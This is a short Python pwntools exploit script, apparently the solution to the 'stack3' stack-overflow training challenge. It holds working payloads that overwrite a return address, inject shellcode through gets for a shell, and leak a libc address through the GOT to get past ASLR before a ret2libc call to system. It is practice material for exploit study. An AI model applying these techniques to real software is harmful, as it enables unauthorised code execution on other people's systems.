from pwn import *
r = process("./stack3")
raw_input('Debug?')
win_func = 0x08048424
main = 0x08048438

def win():
	payload = "a"*(0x5c-0x1c)
	payload += p32(win_func) #ptr
	payload += "a"*(0x68-0x5c)
	payload += p32(win_func)
	r.sendline(payload)
	r.interactive()


def shell():
	shellcode = asm(shellcraft.sh())
	add_shell = 0x8049000
	gets_plt = 0x8048330

	payload = "a"*(0x5c-0x1c)
	payload += p32(win_func) #ptr
	payload += "a"*(0x68-0x5c)
	payload += p32(gets_plt)
	payload += p32(add_shell)
	payload += p32(add_shell)

	r.sendline(payload)
	r.sendline(shellcode)
	r.interactive()

def shell_aslr():
	puts_plt = 0x8048360
	gets_got = 0x804968c
	main = 0x8048438 

	offset_gets = 0x05f3e0
	offset_system = 0x03ada0
	offset_sh = 0x0000E5F2 + 5
	
	payload = "a"*(0x5c-0x1c)
	payload += p32(win_func) #ptr
	payload += "a"*(0x60+8-0x5c)
	payload += p32(puts_plt)	
	payload += p32(main)
	payload += p32(gets_got)
	r.sendline(payload)
	
	r.recvuntil('code flow successfully changed\n')
	res = r.recv(4)
	gets = u32(res)
	print hex(gets)

	libc = gets - offset_gets
	system = libc + offset_system
	sh = libc + offset_sh

	log.info("gets: %#x" % gets)
	log.info("libc: %#x" % libc)
	log.info("system: %#x" % system)
	log.info("sh: %#x" % sh)

	payload = "a"*(0x60+8-0x1c-4-8)
	payload += p32(win_func) #ptr
	payload += "a"*(0x60-0x5c)
	payload += p32(system) #ret add 1
	payload += p32(main) #ret add 2
	payload	+= p32(sh) #arg
	r.sendline(payload)
	
	r.interactive()

# win()
# shell()
shell_aslr()

